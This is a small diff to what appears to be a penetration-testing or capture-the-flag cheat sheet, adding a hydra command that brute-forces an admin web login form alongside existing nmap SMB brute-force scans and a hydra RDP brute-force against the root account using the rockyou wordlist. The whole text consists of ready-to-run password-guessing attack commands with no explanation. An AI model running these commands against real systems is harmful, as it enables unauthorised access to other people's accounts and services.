@@ -3,6 +3,9 @@
 nmap --script=smb-brute.nse 192.x.x.x
 nmap -sV -p 445 --script smb-brute 192.168.13.200-254
 
+## HTTP bruteforce (forms)
+hydra -l admin -P /root/ctf_wordlist.txt domain.com http-post-form "/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username and password to continue'" -V
+
   ## RDP bruteforce
 hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt rdp://192.168.x.x
 
